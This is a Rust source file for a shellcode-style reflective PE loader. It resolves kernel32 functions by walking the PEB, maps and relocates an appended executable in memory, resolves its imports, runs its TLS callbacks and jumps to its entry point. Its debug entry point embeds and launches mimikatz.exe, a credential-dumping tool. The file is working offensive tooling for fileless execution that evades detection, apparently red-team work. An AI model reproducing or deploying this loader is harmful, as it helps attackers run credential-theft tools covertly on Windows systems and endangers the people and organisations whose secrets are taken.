#![cfg_attr(no_std, no_std)]
#![cfg_attr(no_main, no_main)]
#![allow(non_snake_case)]
#![allow(non_camel_case_types)]
#![allow(non_upper_case_globals)]

use core::mem;

use crate::defs::{
    DLL_PROCESS_ATTACH, DLL_PROCESS_DETACH, GETPROCADDRESS, IMAGE_DOS_HEADER, KERNEL32,
    LOADLIBRARY, P_LDREND, PEB, VIRTUALALLOC, VIRTUALPROTECT,
};
use crate::loader::*;

mod defs;
mod loader;
mod utils;

#[unsafe(link_section = ".text")]
#[unsafe(no_mangle)]
pub extern "C" fn ldrmain() -> i32 {
    let mut ptr = unsafe { P_LDREND };

    // Find the MZ header.
    unsafe {
        loop {
            if *ptr != 0x4D {
                ptr = ptr.add(1);
                continue;
            }

            let z = ptr.add(1);
            if *z == 0x5A {
                break;
            }
        }
    }

    let pe_to_load = ptr as *const IMAGE_DOS_HEADER;

    let peb = get_peb_addr() as *const PEB;
    // let kernel32 = PE::initialize(find_module(peb, KERNEL32) as *const
    // IMAGE_DOS_HEADER);
    let kernel32 = find_module(peb, KERNEL32) as *const IMAGE_DOS_HEADER;
    let virtual_alloc_ptr = find_export(kernel32, VIRTUALALLOC);
    let load_library_ptr = find_export(kernel32, LOADLIBRARY);
    let get_proc_address_ptr = find_export(kernel32, GETPROCADDRESS);
    let virtual_protect_ptr = find_export(kernel32, VIRTUALPROTECT);

    let mapped_pe = remap_pe(pe_to_load, virtual_alloc_ptr);
    relocate_pe(mapped_pe);
    resolve_imports(mapped_pe, load_library_ptr, get_proc_address_ptr);
    execute_tls(mapped_pe);
    if !finalize_sections(mapped_pe, virtual_protect_ptr) {
        return 1;
    }

    let aop = get_aop(mapped_pe);
    let entry = mapped_pe as usize + aop;
    // let call = unsafe { mem::transmute::<usize, extern "C" fn(usize, u32,
    // usize) -> i32>(entry) };
    let call = unsafe { mem::transmute::<usize, fn()>(entry) };
    call();
    return 0;

    // call(mapped_pe.base, DLL_PROCESS_ATTACH, 0);
    // call(mapped_pe.base, DLL_PROCESS_DETACH, 0)
}

#[cfg(debug_assertions)]
fn main() {
    let a = include_bytes!("../mimikatz.exe");
    let a = a.to_vec();

    unsafe {
        P_LDREND = a.as_ptr();
    }

    ldrmain();
}
